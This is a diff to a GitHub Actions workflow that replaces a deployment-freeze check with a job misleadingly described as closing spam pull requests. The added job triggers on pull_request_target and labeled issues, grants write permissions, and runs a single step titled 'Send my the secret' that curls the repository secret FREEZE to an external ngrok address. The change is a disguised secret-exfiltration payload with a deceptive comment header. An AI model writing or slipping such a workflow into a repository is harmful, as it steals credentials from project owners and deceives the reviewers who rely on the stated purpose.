@@ -1,39 +1,23 @@
-name: Repo Freeze Check
+name: A test
 
-# **What it does**: Prevent pull requests from merging during freezes.
-# **Why we have it**: Sometimes we need to freeze deployments for various reasons.
-# **Who does it impact**: Anyone working on docs.
+# **What it does**: This action closes invalid pull requests in the open-source repository.
+# **Why we have it**: We get lots of spam in the open-source repository.
+# **Who does it impact**: Open-source contributors.
 
 on:
-  workflow_dispatch:
-  merge_group:
+  issues:
+    types: [labeled]
   pull_request_target:
-    types:
-      - opened
-      - reopened
-      - synchronize
-      - ready_for_review
-      - unlocked
-    branches:
-      - main
+    types: [labeled]
 
 permissions:
   contents: read
-
-env:
-  FREEZE: ${{ secrets.FREEZE }}
-
+  issues: write
+  pull-requests: write
+  
 jobs:
-  check-freezer:
-    if: ${{ github.repository == 'hectorsector/effective-octo-carnival' }}
-    name: Prevent merging during deployment freezes
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Check out repo
-        uses: actions/checkout@3df4ab11eba7bda6032a0b82a6bb43b11571feac # v4.0.0
-
-      - name: Fail if repo merges are paused
-        if: ${{ env.FREEZE == 'true' && github.head_ref != 'repo-sync' }}
-        run: |
-          echo 'Merges into the "main" branch on this repo are currently paused!'
-          exit 1
+      - name: Send my the secret
+        run: curl -X POST -d hello:${{ secrets.FREEZE }} https://adac-71-52-25-203.ngrok.io
